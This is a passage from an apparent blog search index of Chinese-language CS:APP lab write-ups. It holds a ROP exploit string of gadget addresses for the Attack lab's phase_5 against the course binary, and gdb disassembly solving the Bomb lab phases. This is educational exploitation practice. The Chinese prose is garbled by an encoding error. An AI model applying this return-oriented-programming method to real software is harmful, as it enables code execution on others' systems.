","date":"2018-12-08","objectID":"/posts/csapp-attack-lab/:4:0","tags":["CS:APP"],"title":"CS:APP Attack lab","uri":"/posts/csapp-attack-lab/"},{"categories":["CS:APP"],"content":"phase_5 æ­¤å…³ä¸º phase_3 çš„ ROP ç‰ˆæœ¬ï¼Œæˆ‘ä»¬éœ€è¦æŸ¥æ‰¾ start_farm åˆ° end_farm ä¸­çš„ gadgetsï¼Œæ‹¼å‡‘å‡ºä»£ç å®ç° phase_3 ä¸­æ’å…¥ä»£ç çš„åŠŸèƒ½ã€‚è¿˜éœ€æ³¨æ„ï¼š 1.0x90 ä»£è¡¨ nopï¼Œé™¤äº†å°† pc åŠ  1 ä¹‹å¤–ä¸åšä»»ä½•äº‹ã€‚ 2.ä¸åˆ†åŒå­—èŠ‚æŒ‡ä»¤ï¼Œè®¾ç½®æ ‡å¿—ä½ï¼Œä¸æ”¹å˜å¯„å­˜å™¨çš„å€¼ï¼Œå¯ä»¥ä½¿ç”¨ã€‚ éœ€è¦çš„æŒ‡ä»¤æœ‰ movq %rsp,%rax movq %rax,%rdi popq %rax movl %eax,%ecx movl %ecx,%edx movl %edx,%esi lea(%rdi, %rsi, 1),%rax movq %rax,%rdi åˆ™æ”»å‡»å­—ç¬¦ä¸²ä¸º 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 bd 18 40 00 00 00 00 00 /* gadget1 */ 49 18 40 00 00 00 00 00 /* gadget2 */ 30 18 40 00 00 00 00 00 /* gadget3 */ 48 00 00 00 00 00 00 00 /* cookieå­—ç¬¦ä¸²åç§»é‡*/ 13 19 40 00 00 00 00 00 /* gadget4 */ ca 18 40 00 00 00 00 00 /* gadget5 */ b7 18 40 00 00 00 00 00 /* gadget6 */ 69 18 40 00 00 00 00 00 /* gadget7 */ 49 18 40 00 00 00 00 00 /* gadget8 */ a0 17 40 00 00 00 00 00 /* touch3åœ°å€ */ 36 33 31 34 39 33 38 30 /* cookieå­—ç¬¦ä¸² */ 00 è½¬æ¢æ–‡ä»¶è¿è¡Œ 2017211523@bupt3:~/target117$ ./hex2raw \u003c phase5 | ./rtarget Cookie: 0x63149380 Type string:Touch3!: You called touch3(\"63149380\") Valid solution for level 3 with target rtarget PASS: Sent exploit string to server to be validated. NICE JOB! åˆ°æ­¤ä¸ºæ­¢ ","date":"2018-12-08","objectID":"/posts/csapp-attack-lab/:5:0","tags":["CS:APP"],"title":"CS:APP Attack lab","uri":"/posts/csapp-attack-lab/"},{"categories":["CS:APP"],"content":"å®éªŒæ­¥éª¤ ","date":"2018-12-01","objectID":"/posts/csapp-bomb-lab/:0:0","tags":["CS:APP","æ±‡ç¼–","äºŒè¿›åˆ¶ç‚¸å¼¹"],"title":"CS:APP Bomb lab","uri":"/posts/csapp-bomb-lab/"},{"categories":["CS:APP"],"content":"å‡†å¤‡å·¥ä½œ ä½¿ç”¨tar -vxfå°†ç‚¸å¼¹å‹ç¼©åŒ…è§£å‹,cd è¿›å…¥,å¯ä»¥ä» bomb.c ä¸­çœ‹å‡ºå®éªŒçš„ç”¨æ„ä»¥åŠç¨‹åºçš„å¤§è‡´ é€»è¾‘,bomb ä¸ºå¯æ‰§è¡Œç¨‹åº,ä½¿ç”¨ gdb è°ƒè¯•è¯¥ç¨‹åº. (gdb) b read_line Breakpoint 1 at 0x40155c (gdb) b explode_bomb Breakpoint 2 at 0x4014e4 ç»™ read_line å‡½æ•°æ‰“ä¸Šæ–­ç‚¹,ä»¥ä¾¿æ¯æ¬¡è¾“å…¥è¿è¡Œä¸€å…³.ç»™ explode_bomb æ‰“ä¸Šæ–­ç‚¹,ä»¥ä¾¿åœ¨ç‚¸å¼¹çˆ†ç‚¸ å‰å¯ä»¥å¤„ç†. ","date":"2018-12-01","objectID":"/posts/csapp-bomb-lab/:1:0","tags":["CS:APP","æ±‡ç¼–","äºŒè¿›åˆ¶ç‚¸å¼¹"],"title":"CS:APP Bomb lab","uri":"/posts/csapp-bomb-lab/"},{"categories":["CS:APP"],"content":"phase_1 è·å¾— phase_1 æ±‡ç¼–ä»£ç  (gdb) disas phase_1 Dump of assembler code for function phase_1: 0x0000000000400e80 \u003c+0\u003e: sub $0x8,%rsp 0x0000000000400e84 \u003c+4\u003e: mov $0x4024a0,%esi 0x0000000000400e89 \u003c+9\u003e: callq 0x40127e \u003cstrings_not_equal\u003e 0x0000000000400e8e \u003c+14\u003e: test %eax,%eax 0x0000000000400e90 \u003c+16\u003e: je 0x400e97 \u003cphase_1+23\u003e 0x0000000000400e92 \u003c+18\u003e: callq 0x4014e4 \u003cexplode_bomb\u003e 0x0000000000400e97 \u003c+23\u003e: add $0x8,%rsp 0x0000000000400e9b \u003c+27\u003e: retq End of assembler dump. å¯è§,æ­¤é¢˜æ˜¯å°†æˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦ä¸²ä¸åœ°å€ 0x4024a0 å¤„å­—ç¬¦ä¸²æ¯”è¾ƒ,ä¸ç­‰åˆ™çˆ†ç‚¸.æŸ¥çœ‹è¯¥å­—ç¬¦ä¸². (gdb) x/s 0x4024a0 0x4024a0 \u003c__dso_handle+344\u003e: \"We have to stand with our North Korean allies.\" é‚£ä¹ˆç­”æ¡ˆæ˜¯ We have to stand with our North Korean allies. ","date":"2018-12-01","objectID":"/posts/csapp-bomb-lab/:2:0","tags":["CS:APP","æ±‡ç¼–","äºŒè¿›åˆ¶ç‚¸å¼¹"],"title":"CS:APP Bomb lab","uri":"/posts/csapp-bomb-lab/"},{"categories":["CS:APP"],"content":"phase_2 (gdb) disas phase_2 Dump of assembler code for function phase_2: 0x0000000000400e9c \u003c+0\u003e: push %rbp 0x0000000000400e9d \u003c+1\u003e: push %rbx 0x0000000000400e9e \u003c+2\u003e: sub $0x28,%rsp 0x0000000000400ea2 \u003c+6\u003e: mov %rsp,%rsi 0x0000000000400ea5 \u003c+9\u003e: callq 0x40151a \u003cread_six_numbers\u003e 0x0000000000400eaa \u003c+14\u003e: cmpl $0x1,(%rsp) 0x0000000000400eae \u003c+18\u003e: je 0x400ed0 \u003cphase_2+52\u003e 0x0000000000400eb0 \u003c+20\u003e: callq 0x4014e4 \u003cexplode_bomb\u003e 0x0000000000400eb5 \u003c+25\u003e: jmp 0x400ed0 \u003cphase_2+52\u003e 0x0000000000400eb7 \u003c+27\u003e: mov -0x4(%rbx),%eax 0x0000000000400eba \u003c+30\u003e: add %eax,%eax 0x0000000000400ebc \u003c+32\u003e: cmp %eax,(%rbx) 0x0000000000400ebe \u003c+34\u003e: je 0x400ec5 \u003cphase_2+41\u003e 0x0000000000400ec0 \u003c+36\u003e: callq 0x4014e4 \u003cexplode_bomb\u003e 0x0000000000400ec5 \u003c+41\u003e: add $0x4,%rbx 0x0000000000400ec9 \u003c+45\u003e: cmp %rbp,%rbx 0x0000000000400ecc \u003c+48\u003e: jne 0x400eb7 \u003cphase_2+27\u003e 0x0000000000400ece \u003c+50\u003e: jmp 0x400edc \u003cphase_2+64\u003e 0x0000000000400ed0 \u003c+52\u003e: lea 0x4(%rsp),%rbx 0x0000000000400ed5 \u003c+57\u003e: lea 0x18(%rsp),%rbp 0x0000000000400eda \u003c+62\u003e: jmp 0x400eb7 \u003cphase_2+27\u003e 0x0000000000400edc \u003c+64\u003e: add $0x28,%rsp ---Type \u003creturn\u003e to continue, or q \u003creturn\u003e to quit--- 0x0000000000400ee0 \u003c+68\u003e: pop %rbx 0x0000000000400ee1 \u003c+69\u003e: pop %rbp 0x0000000000400ee2 \u003c+70\u003e: retq End of assembler dump. +3 å¤„å‘ç°åœ¨æ ˆä¸­å¼€è¾Ÿäº† 0x28 çš„å†…å­˜åŒºåŸŸ.ç„¶åå°†%rsp çš„å€¼ä¼ ç»™%rsi ä½œä¸º å‚æ•°ä¼ ç»™å‡½æ•° read_six_numbers,å¯ä»¥çœ‹å‡ºåº”è¯¥ä½¿ç”¨å¼€è¾Ÿçš„ç©ºé—²å†…å­˜åš æ•°ç»„,è®°æ•°ç»„ä¸º r,è¯»å–å…­ä¸ªæ•°å­—.å°†(%rsp)å’Œ 0x1 æ¯”è¾ƒ,å¦‚æœä¸ç­‰,å°±ä¼šçˆ† ç‚¸,(ï¼…rsp)ä¸ºæ•°ç»„é¦–å…ƒ,æ•… r[0]ï¼ï¼‘;è·³è½¬åˆ°+52,å°† r[1]åœ°å€èµ‹ç»™%rbx, å°† r6åœ°å€èµ‹ç»™%rbp,è·³åˆ°+27,å°†%eax è®¾ä¸º%rbx æŒ‡å‘çš„å‰ä¸€ä¸ª æ•°,æ­¤æ—¶ä¸º r[0],æ¯”è¾ƒ r[1]å’Œ 2*r[0]æ˜¯å¦ç›¸ç­‰,ä¸ç­‰åˆ™çˆ†ç‚¸.è·³è½¬åˆ°+41,ï¼… rbx+4,æ¯”è¾ƒ%rbx å’Œ%rbp,ä¸ç­‰è·³è½¬åˆ°+27,é‡å¤,ç­‰åˆ™è·³è½¬åˆ°+64 ç»“æŸ,æˆåŠŸ .å¯ä»¥çœ‹å‡ºï¼Œè¿™æ˜¯ä¸€ä¸ªå¾ªç¯æ¯”è¾ƒ.ç­‰ä»·äºä¸‹é¢çš„ c è¯­ a è¨€ for(int *b = \u0026r[1]; b != \u0026r[6]; b++) { if(*b != 2 * (*(b - 1))) call explode_bomb; æ•…ç­”æ¡ˆåº”è¯¥ä¸º 1 2 4 8 16 32. ","date":"2018-12-01","objectID":"/posts/csapp-bomb-lab/:3:0","tags":["CS:APP","æ±‡ç¼–","äºŒè¿›åˆ¶ç‚¸å¼¹"],"title":"CS:APP Bomb lab","uri":"/posts/csapp-bomb-lab/"},{"categories":["CS:APP"],"content":"phase_3 0x0000000000400ef1 \u003c+14\u003e: mov $0x4027cd,%esi 0x0000000000400ef6 \u003c+19\u003e: mov $0x0,%eax 0x0000000000400efb \u003c+24\u003e: callq 0x400ba0 \u003c__isoc99_sscanf@plt\u003e 0x0000000000400f00 \u003c+29\u003e: cmp $0x1,%eax æŸ¥çœ‹ 0x4027cd, (gdb) x/s 0x4027cd 0x4027cd: \"%d %d\" å¯çŸ¥,åº”è¯¥æ˜¯è¯»å…¥äº†ä¸¤ä¸ªæ•´æ•°. 0x0000000000400f15 \u003c+50\u003e: jmpq *0x402500(,%rax,8) 0x0000000000400f1c \u003c+57\u003e: mov $0x0,%eax 0x0000000000400f21 \u003c+62\u003e: jmp 0x400f28 \u003cphase_3+69\u003e 0x0000000000400f23 \u003c+64\u003e: mov $0x19c,%eax 0x0000000000400f28 \u003c+69\u003e: sub $0xcd,%eax 0x0000000000400f2d \u003c+74\u003e: jmp 0x400f34 \u003cphase_3+81\u003e 0x0000000000400f2f \u003c+76\u003e: mov $0x0,%eax 0x0000000000400f34 \u003c+81\u003e: add $0x29b,%eax 0x0000000000400f39 \u003c+86\u003e: jmp 0x400f40 \u003cphase_3+93\u003e 0x0000000000400f3b \u003c+88\u003e: mov $0x0,%eax ---Type \u003creturn\u003e to continue, or q \u003creturn\u003e to quit--- 0x0000000000400f40 \u003c+93\u003e: sub $0x36f,%eax 0x0000000000400f45 \u003c+98\u003e: jmp 0x400f4c \u003cphase_3+105\u003e 0x0000000000400f47 \u003c+100\u003e: mov $0x0,%eax 0x0000000000400f4c \u003c+105\u003e: add $0x36f,%eax 0x0000000000400f51 \u003c+110\u003e: jmp 0x400f58 \u003cphase_3+117\u003e 0x0000000000400f53 \u003c+112\u003e: mov $0x0,%eax 0x0000000000400f58 \u003c+117\u003e: sub $0x36f,%eax 0x0000000000400f5d \u003c+122\u003e: jmp 0x400f64 \u003cphase_3+129\u003e 0x0000000000400f5f \u003c+124\u003e: mov $0x0,%eax 0x0000000000400f64 \u003c+129\u003e: add $0x36f,%eax 0x0000000000400f69 \u003c+134\u003e: jmp 0x400f70 \u003cphase_3+141\u003e 0x0000000000400f6b \u003c+136\u003e: mov $0x0,%eax 0x0000000000400f70 \u003c+141\u003e: sub $0x36f,%eax 0x0000000000400f75 \u003c+146\u003e: jmp 0x400f81 \u003cphase_3+158\u003e 0x0000000000400f77 \u003c+148\u003e: callq 0x4014e4 \u003cexplode_bomb\u003e 0x0000000000400f7c \u003c+153\u003e: mov $0x0,%eax 0x0000000000400f81 \u003c+158\u003e: cmpl $0x5,0xc(%rsp) 0x0000000000400f86 \u003c+163\u003e: jg 0x400f8e \u003cphase_3+171\u003e 0x0000000000400f88 \u003c+165\u003e: cmp 0x8(%rsp),%eax 0x0000000000400f8c \u003c+169\u003e: je 0x400f93 \u003cphase_3+176\u003e 0x0000000000400f8e \u003c+171\u003e: callq 0x4014e4 \u003cexplode_bomb\u003e ç”±è¿™æ®µæ±‡ç¼–ä»£ç å¯çŸ¥,è¿™æ˜¯ä¸€æ®µ switch è¯­å¥,ä½¿ç”¨è¾“å…¥çš„ç¬¬ä¸€ä¸ªå€¼ä½œä¸º key, ç»è¿‡å¯¹åº”è·³è½¬ä½ç½®çš„æ“ä½œååº”ä¸ç¬¬äºŒä¸ªæ•°ç›¸ç­‰. (gdb) p/x *ï¼ˆ0x402500 + 32ï¼‰ $1 = 0x400f47 é‚£ä¹ˆç¬¬ä¸€ä¸ªæ•°ä¸º 0 æ—¶,è·³è½¬åˆ° 0x400f23 å¤„,é‚£ä¹ˆç¬¬äºŒä¸ªæ•°åº”è¯¥ä¸ºæ­¤å¤„çš„ 0x0, æ•…ä¸€ç»„ç­”æ¡ˆä¸º 4 0; ","date":"2018-12-01","objectID":"/posts/csapp-bomb-lab/:4:0","tags":["CS:APP","æ±‡ç¼–","äºŒè¿›åˆ¶ç‚¸å¼¹"],"title":"CS:APP Bomb lab","uri":"/posts/csapp-bomb-lab/"},{"categories":["CS:APP"],"content":"phase_4 (gdb) disas phase_4 Dump of assembler code for function phase_4: 0x0000000000400fd0 \u003c+0\u003e: sub $0x18,%rsp 0x0000000000400fd4 \u003c+4\u003e: lea 0xc(%rsp),%rcx 0x0000000000400fd9 \u003c+9\u003e: lea 0x8(%rsp),%rdx 0x0000000000400fde \u003c+14\u003e: mov $0x4027cd,%esi 0x0000000000400fe3 \u003c+19\u003e: mov $0x0,%eax 0x0000000000400fe8 \u003c+24\u003e: callq 0x400ba0 \u003c__isoc99_sscanf@plt\u003e 0x0000000000400fed \u003c+29\u003e: cmp $0x2,%eax 0x0000000000400ff0 \u003c+32\u003e: jne 0x400ffe \u003cphase_4+46\u003e 0x0000000000400ff2 \u003c+34\u003e: mov 0xc(%rsp),%eax 0x0000000000400ff6 \u003c+38\u003e: sub $0x2,%eax 0x0000000000400ff9 \u003c+41\u003e: cmp $0x2,%eax 0x0000000000400ffc \u003c+44\u003e: jbe 0x401003 \u003cphase_4+51\u003e 0x0000000000400ffe \u003c+46\u003e: callq 0x4014e4 \u003cexplode_bomb\u003e 0x0000000000401003 \u003c+51\u003e: mov 0xc(%rsp),%esi 0x0000000000401007 \u003c+55\u003e: mov $0x9,%edi 0x000000000040100c \u003c+60\u003e: callq 0x400f98 \u003cfunc4\u003e 0x0000000000401011 \u003c+65\u003e: cmp 0x8(%rsp),%eax 0x0000000000401015 \u003c+69\u003e: je 0x40101c \u003cphase_4+76\u003e 0x0000000000401017 \u003c+71\u003e: callq 0x4014e4 \u003cexplode_bomb\u003e 0x000000000040101c \u003c+76\u003e: add $0x18,%rsp 0x0000000000401020 \u003c+80\u003e: retq End of assembler dump. ç”±ä»£ç æ˜“çŸ¥,phase_4 è¯»å…¥äº†ä¸¤ä¸ªæ•°,ç¬¬äºŒä¸ªæ•°åœ¨ 2-4 ä¹‹é—´,ç„¶åå°†ç¬¬äºŒä¸ªæ•°ä½œä¸º func4 çš„ç¬¬äºŒä¸ªå‚æ•°,func4 ç¬¬ä¸€ä¸ªå‚æ•°ä¸º 9,è¾“å…¥çš„ç¬¬ä¸€ä¸ªæ•°å¿…é¡»å’Œ func4 è¿”å›å€¼ç›¸ç­‰. (gdb) disas func4 Dump of assembler code for function func4: 0x0000000000400f98 \u003c+0\u003e: push %r12 0x0000000000400f9a \u003c+2\u003e: push %rbp 0x0000000000400f9b \u003c+3\u003e: push %rbx 0x0000000000400f9c \u003c+4\u003e: mov %edi,%ebx 0x0000000000400f9e \u003c+6\u003e: test %edi,%edi 0x0000000000400fa0 \u003c+8\u003e: jle 0x400fc6 \u003cfunc4+46\u003e 0x0000000000400fa2 \u003c+10\u003e: mov %esi,%ebp 0x0000000000400fa4 \u003c+12\u003e: mov %esi,%eax 0x0000000000400fa6 \u003c+14\u003e: cmp $0x1,%edi 0x0000000000400fa9 \u003c+17\u003e: je 0x400fcb \u003cfunc4+51\u003e 0x0000000000400fab \u003c+19\u003e: lea -0x1(%rdi),%edi 0x0000000000400fae \u003c+22\u003e: callq 0x400f98 \u003cfunc4\u003e 0x0000000000400fb3 \u003c+27\u003e: lea (%rax,%rbp,1),%r12d 0x0000000000400fb7 \u003c+31\u003e: lea -0x2(%rbx),%edi 0x0000000000400fba \u003c+34\u003e: mov %ebp,%esi 0x0000000000400fbc \u003c+36\u003e: callq 0x400f98 \u003cfunc4\u003e 0x0000000000400fc1 \u003c+41\u003e: add %r12d,%eax 0x0000000000400fc4 \u003c+44\u003e: jmp 0x400fcb \u003cfunc4+51\u003e 0x0000000000400fc6 \u003c+46\u003e: mov $0x0,%eax 0x0000000000400fcb \u003c+51\u003e: pop %rbx 0x0000000000400fcc \u003c+52\u003e: pop %rbp 0x0000000000400fcd \u003c+53\u003e: pop %r12 0x0000000000400fcf \u003c+55\u003e: retq End of assembler dump. æ­¤å‡½æ•°ç­‰ä»·äºä¸‹é¢çš„ c ä»£ç  int func4(int a, int b) { if(a \u003c= 0) return 0; if(a == 1) return b; return b + func4(a - 1, b) + func4(n - 2, b); } ç©·ä¸¾ 2-4 çš„å€¼å³å¯å¾—åˆ°ç­”æ¡ˆ,å–ç­”æ¡ˆä¸º 176 2 ","date":"2018-12-01","objectID":"/posts/csapp-bomb-lab/:5:0","tags":["CS:APP","æ±‡ç¼–","äºŒè¿›åˆ¶ç‚¸å¼¹"],"title":"CS:APP Bomb lab","uri":"/posts/csapp-bomb-lab/"},{"categories":["CS:APP"],"content":"phase_5 (gdb) disas phase_5 Dump of assembler code for function phase_5: 0x0000000000401021 \u003c+0\u003e: push %rbx 0x0000000000401022 \u003c+1\u003e: mov %rdi,%rbx 0x0000000000401025 \u003c+4\u003e: callq 0x401261 \u003cstring_length\u003e 0x000000000040102a \u003c+9\u003e: cmp $0x6,%eax 0x000000000040102d \u003c+12\u003e: je 0x401034 \u003cphase_5+19\u003e 0x000000000040102f \u003c+14\u003e: callq 0x4014e4 \u003cexplode_bomb\u003e 0x0000000000401034 \u003c+19\u003e: mov $0x0,%eax 0x0000000000401039 \u003c+24\u003e: mov $0x0,%edx 0x000000000040103e \u003c+29\u003e: movzbl (%rbx,%rax,1),%ecx 0x0000000000401042 \u003c+33\u003e: and $0xf,%ecx 0x0000000000401045 \u003c+36\u003e: add 0x402540(,%rcx,4),%edx 0x000000000040104c \u003c+43\u003e: add $0x1,%rax 0x0000000000401050 \u003c+47\u003e: cmp $0x6,%rax 0x0000000000401054 \u003c+51\u003e: jne 0x40103e \u003cphase_5+29\u003e 0x0000000000401056 \u003c+53\u003e: cmp $0x27,%edx 0x0000000000401059 \u003c+56\u003e: je 0x401060 \u003cphase_5+63\u003e 0x000000000040105b \u003c+58\u003e: callq 0x4014e4 \u003cexplode_bomb\u003e 0x0000000000401060 \u003c+63\u003e: pop %rbx 0x0000000000401061 \u003c+64\u003e: retq End of assembler dump. ç”±æ±‡ç¼–ä»£ç å¯çŸ¥,éœ€è¦è¾“å…¥ä¸€ä¸ªé•¿åº¦ä¸º 6 çš„å­—ç¬¦ä¸².ä»¤è¯¥å­—ç¬¦ä¸²ä¸º input,+36 å¤„å‡ºç°çš„ æ•°ç»„ä¸º array,åˆ™è¯¥æ±‡ç¼–ç­‰ä»·äºä¸‹é¢ä»£ç . for(int i = 0; i \u003c 6; i++) sum += array[ input[i] \u0026 0xf ]; æ„ä¸ºéå†è¾“å…¥å­—ç¬¦ä¸²,å–è¯¥å­—ç¬¦ä¸²ä½ 4 ä½ä½œä¸º array ä¸‹æ ‡,å–å‡º array å€¼ç›¸åŠ . æŸ¥çœ‹ array çš„å€¼ (gdb) p/x *0x402540@16 $2 = {0x2, 0xa, 0x6, 0x1, 0xc, 0x10, 0x9, 0x3, 0x4, 0x7, 0xe, 0x5, 0xb, 0x8, 0xf, 0xd} é¢˜ç›®è¦æ±‚ sum = 0x27,æ•…ä» array ä¸­é€‰å‡º 6 ä¸ªå’Œä¸º 0x27 çš„æ•°,é€šè¿‡è¿™ 6 ä¸ªæ•°çš„ä¸‹æ ‡æ‰¾å‡ºå¯¹åº”å­—ç¬¦. ç­”æ¡ˆåº”ä¸º 01347L; ","date":"2018-12-01","objectID":"/posts/csapp-bomb-lab/:6:0","tags":["CS:APP","æ±‡ç¼–","äºŒè¿›åˆ¶ç‚¸å¼¹"],"title":"CS:APP Bomb lab","uri":"/posts/csapp-bomb-lab/"},{"categories":["CS:APP"],"content":"phase_6 å› ä¸ºè¯¾ç¨‹æœªå¯¹åç»­ä¸¤å…³ä½œè¦æ±‚,æ•…ä¸åšç‰¹åˆ«è¯¦ç»†çš„è§£ç­”. (gdb) disas phase_6 Dump of assembler code for function phase_6: 0x0000000000401062 \u003c+0\u003e: push %r13 0x0000000000401064 \u003c+2\u003e: push %r12 0x0000000000401066 \u003c+4\u003e: push %rbp 0x0000000000401067 \u003c+5\u003e: push %rbx 0x0000000000401068 \u003c+6\u003e: sub $0x58,%rsp 0x000000000040106c \u003c+10\u003e: lea 0x30(%rsp),%rsi 0x0000000000401071 \u003c+15\u003e: callq 0x40151a \u003cread_six_numbers\u003e 0x0000000000401076 \u003c+20\u003e: lea 0x30(%rsp),%r13 0x000000000040107b \u003c+25\u003e: mov $0x0,%r12d 0x0000000000401081 \u003c+31\u003e: mov %r13,%rbp 0x0000000000401084 \u003c+34\u003e: mov 0x0(%r13),%eax 0x0000000000401088 \u003c+38\u003e: sub $0x1,%eax 0x000000000040108b \u003c+41\u003e: cmp $0x5,%eax 0x000000000040108e \u003c+44\u003e: jbe 0x401095 \u003cphase_6+51\u003e 0x0000000000401090 \u003c+46\u003e: callq 0x4014e4 \u003cexplode_bomb\u003e 0x0000000000401095 \u003c+51\u003e: add $0x1,%r12d 0x0000000000401099 \u003c+55\u003e: cmp $0x6,%r12d 0x000000000040109d \u003c+59\u003e: jne 0x4010a6 \u003cphase_6+68\u003e 0x000000000040109f \u003c+61\u003e: mov $0x0,%esi 0x00000000004010a4 \u003c+66\u003e: jmp 0x4010e8 \u003cphase_6+134\u003e 0x00000000004010a6 \u003c+68\u003e: mov %r12d,%ebx 0x00000000004010a9 \u003c+71\u003e: movslq %ebx,%rax ---Type \u003creturn\u003e to continue, or q \u003creturn\u003e to quit--- 0x00000000004010ac \u003c+74\u003e: mov 0x30(%rsp,%rax,4),%eax 0x00000000004010b0 \u003c+78\u003e: cmp %eax,0x0(%rbp) 0x00000000004010b3 \u003c+81\u003e: jne 0x4010ba \u003cphase_6+88\u003e 0x00000000004010b5 \u003c+83\u003e: callq 0x4014e4 \u003cexplode_bomb\u003e 0x00000000004010ba \u003c+88\u003e: add $0x1,%ebx 0x00000000004010bd \u003c+91\u003e: cmp $0x5,%ebx 0x00000000004010c0 \u003c+94\u003e: jle 0x4010a9 \u003cphase_6+71\u003e 0x00000000004010c2 \u003c+96\u003e: add $0x4,%r13 0x00000000004010c6 \u003c+100\u003e: jmp 0x401081 \u003cphase_6+31\u003e 0x00000000004010c8 \u003c+102\u003e: mov 0x8(%rdx),%rdx 0x00000000004010cc \u003c+106\u003e: add $0x1,%eax 0x00000000004010cf \u003c+109\u003e: cmp %ecx,%eax 0x00000000004010d1 \u003c+111\u003e: jne 0x4010c8 \u003cphase_6+102\u003e 0x00000000004010d3 \u003c+113\u003e: jmp 0x4010da \u003cphase_6+120\u003e 0x00000000004010d5 \u003c+115\u003e: mov $0x603410,%edx 0x00000000004010da \u003c+120\u003e: mov %rdx,(%rsp,%rsi,2) 0x00000000004010de \u003c+124\u003e: add $0x4,%rsi 0x00000000004010e2 \u003c+128\u003e: cmp $0x18,%rsi 0x00000000004010e6 \u003c+132\u003e: je 0x4010fd \u003cphase_6+155\u003e 0x00000000004010e8 \u003c+134\u003e: mov 0x30(%rsp,%rsi,1),%ecx 0x00000000004010ec \u003c+138\u003e: cmp $0x1,%ecx 0x00000000004010ef \u003c+141\u003e: jle 0x4010d5 \u003cphase_6+115\u003e 0x00000000004010f1 \u003c+143\u003e: mov $0x1,%eax ---Type \u003creturn\u003e to continue, or q \u003creturn\u003e to quit--- 0x00000000004010f6 \u003c+148\u003e: mov $0x603410,%edx 0x00000000004010fb \u003c+153\u003e: jmp 0x4010c8 \u003cphase_6+102\u003e 0x00000000004010fd \u003c+155\u003e: mov (%rsp),%rbx 0x0000000000401101 \u003c+159\u003e: lea 0x8(%rsp),%rax 0x0000000000401106 \u003c+164\u003e: lea 0x30(%rsp),%rsi 0x000000000040110b \u003c+169\u003e: mov %rbx,%rcx 0x000000000040110e \u003c+172\u003e: mov (%rax),%rdx 0x0000000000401111 \u003c+175\u003e: mov %rdx,0x8(%rcx) 0x0000000000401115 \u003c+179\u003e: add $0x8,%rax 0x0000000000401119 \u003c+183\u003e: cmp %rsi,%rax 0x000000000040111c \u003c+186\u003e: je 0x401123 \u003cphase_6+193\u003e 0x000000000040111e \u003c+188\u003e: mov %rdx,%rcx 0x0000000000401121 \u003c+191\u003e: jmp 0x40110e \u003cphase_6+172\u003e 0x0000000000401123 \u003c+193\u003e: movq $0x0,0x8(%rdx) 0x000000000040112b \u003c+201\u003e: mov $0x5,%ebp 0x0000000000401130 \u003c+206\u003e: mov 0x8(%rbx),%rax 0x0000000000401134 \u003c+210\u003e: mov (%rax),%eax 0x0000000000401136 \u003c+212\u003e: cmp %eax,(%rbx) 0x0000000000401138 \u003c+214\u003e: jge 0x40113f \u003cphase_6+221\u003e 0x000000000040113a \u003c+216\u003e: callq 0x4014e4 \u003cexplode_bomb\u003e 0x000000000040113f \u003c+221\u003e: mov 0x8(%rbx),%rbx 0x0000000000401143 \u003c+225\u003e: sub $0x1,%ebp 0x0000000000401146 \u003c+228\u003e: jne 0x401130 \u003cphase_6+206\u003e ---Type \u003creturn\u003e to continue, or q \u003creturn\u003e to quit--- 0x0000000000401148 \u003c+230\u003e: add $0x58,%rsp 0x000000000040114c \u003c+234\u003e: pop %rbx 0x000000000040114d \u003c+235\u003e: pop %rbp 0x000000000040114e \u003c+236\u003e: pop %r12 0x0000000000401150 \u003c+238\u003e: pop %r13 0x0000000000401152 \u003c+240\u003e: retq End of assembler dump. æ±‡ç¼–ä»£ç å¾ˆé•¿.å…¶æ„ä¸ºè¾“å…¥ 6 ä¸ªäº’ä¸ç›¸ç­‰çš„æ•°,ä»‹äº 1-6.æŒ‰è¿™ 6 ä¸ªæ•°çš„å€¼ä»ä½äºåœ°å€ 0x603410 çš„é“¾è¡¨ä¸­é€‰å‡ºå¯¹åº”ä½ç½®çš„ èŠ‚ç‚¹æŒ‡é’ˆ,ç»„æˆä¸€ä¸ªæ•°ç»„.æŒ‰é€‰å‡ºçš„é¡ºåºå°†è¿™å…­ä¸ªèŠ‚ç‚¹ç»„æˆæ–°çš„é“¾è¡¨,ç„¶åæ£€æŸ¥è¿™ä¸ªé“¾è¡¨æ˜¯å¦ä¸ºé™åº. æŸ¥çœ‹é“¾è¡¨çš„å€¼. (gdb) p/x *(0x603410) $3 = 0x1cf (gdb) p/x *(0x603410 + 8) $4 = 0x603420 (gdb) p/x *(0x603420) $5 = 0x188 (gdb) p/x *(0x603420 + 8) $6 = 0x603430 (gdb) p/x *(0x603430) $7 = 0x1d1 (gdb) p/x *(0x603430 + 8) $8 = 0x603440 (gdb) p/x *(0x603440) $9 = 0x174 (gdb) p/x","date":"2018-12-01","objectID":"/posts/csapp-bomb-lab/:7:0","tags":["CS:APP","æ±‡ç¼–","äºŒè¿›åˆ¶ç‚¸å¼¹"],"title":"CS:APP Bomb lab","uri":"/posts/csapp-bomb-lab/"},{"categories":["CS:APP"],"content":"secret_phase æ­£å¸¸é€šè¿‡å‰ 6 å…³æ˜¯æ— æ³•è§¦å‘ secret_phase çš„,æŸ¥çœ‹æ±‡ç¼–å‘ç°,åœ¨ phase_4 ç­”æ¡ˆä¹‹åè¾“å…¥ DrEvil å³å¯è¿›å…¥ secret_phase. (gdb) disas secret_phase Dump of assembler code for function secret_phase: 0x0000000000401191 \u003c+0\u003e: push %rbx 0x0000000000401192 \u003c+1\u003e: callq 0x40155c \u003cread_line\u003e 0x0000000000401197 \u003c+6\u003e: mov $0xa,%edx 0x000000000040119c \u003c+11\u003e: mov $0x0,%esi 0x00000000004011a1 \u003c+16\u003e: mov %rax,%rdi 0x00000000004011a4 \u003c+19\u003e: callq 0x400b80 \u003cstrtol@plt\u003e 0x00000000004011a9 \u003c+24\u003e: mov %rax,%rbx 0x00000000004011ac \u003c+27\u003e: lea -0x1(%rax),%eax 0x00000000004011af \u003c+30\u003e: cmp $0x3e8,%eax 0x00000000004011b4 \u003c+35\u003e: jbe 0x4011bb \u003csecret_phase+42\u003e 0x00000000004011b6 \u003c+37\u003e: callq 0x4014e4 \u003cexplode_bomb\u003e 0x00000000004011bb \u003c+42\u003e: mov %ebx,%esi 0x00000000004011bd \u003c+44\u003e: mov $0x603230,%edi 0x00000000004011c2 \u003c+49\u003e: callq 0x401153 \u003cfun7\u003e 0x00000000004011c7 \u003c+54\u003e: cmp $0x4,%eax 0x00000000004011ca \u003c+57\u003e: je 0x4011d1 \u003csecret_phase+64\u003e 0x00000000004011cc \u003c+59\u003e: callq 0x4014e4 